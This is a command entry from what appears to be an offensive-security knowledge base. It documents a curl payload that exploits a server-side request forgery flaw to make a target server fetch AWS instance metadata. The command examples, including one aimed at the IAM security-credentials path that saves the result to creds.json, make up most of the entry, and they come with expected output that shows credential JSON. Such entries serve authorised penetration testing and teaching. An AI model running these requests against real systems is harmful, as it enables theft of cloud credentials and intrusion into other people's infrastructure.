---
id: 0adaea7a-64d1-4724-9897-4871fc65f611
name: curl-fetch-aws-instance-metadata
type: command
executor: bash
data: >-
  curl
  "http://$_VULNERABLE_ENDPOINT?$_SSRF_PARAM=http://169.254.169.254/2009-04-04/meta-data/"
  -v
output: null
created_at: '2023-04-06T03:56:38.644981+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - ssrf
  - aws
  - curl
  - metadata
verified: true
validated: true
---

# curl-fetch-aws-instance-metadata

## Command

```bash
curl "http://$_VULNERABLE_ENDPOINT?$_SSRF_PARAM=http://169.254.169.254/2009-04-04/meta-data/" -v
```

## Description

This command uses curl to exploit an SSRF vulnerability by sending a crafted HTTP request to a vulnerable web application endpoint. It forces the server to fetch the AWS EC2 instance metadata service, returning internal cloud configuration details. Use this in the context of a confirmed SSRF vulnerability to perform cloud service discovery and data collection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULNERABLE_ENDPOINT | The URL of the SSRF-vulnerable endpoint in the target application (e.g., http://target.com/api/fetch) | Yes |
| $_SSRF_PARAM | The vulnerable parameter name that accepts URLs (e.g., url, redirect_uri) | Yes |
| -v | Verbose mode to show request/response headers for debugging | No |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://169.254.169.254/2009-04-04/meta-data/" -v
```

### Advanced Usage (with Specific Path for IAM Credentials)

```bash
curl "http://target.com/ssrf?url=http://169.254.169.254/2009-04-04/meta-data/iam/security-credentials/MyRole" -v -o creds.json
```

This saves the output to a file for analysis.

## Expected Output

Successful execution returns the metadata content in the response body, such as:

```
ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
hostname
instance-action
instance-id
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
user-data
```

Headers may show a 200 OK status. For credential paths, expect JSON like:

```json
{
  "AccessKeyId": "ASIAEXAMPLE...",
  "SecretAccessKey": "wJalrXUtnFEMI/...",
  "Token": "IQoJb3JpZ2lu...",
  "Expiration": "2023-10-01T12:00:00Z"
}
```

If the SSRF is blocked, expect errors like 403 Forbidden or empty body.

## Related

- [[Related Procedure: Exploit-SSRF-to-Retrieve-AWS-Instance-Metadata]]
- [[Related Tool: curl]]
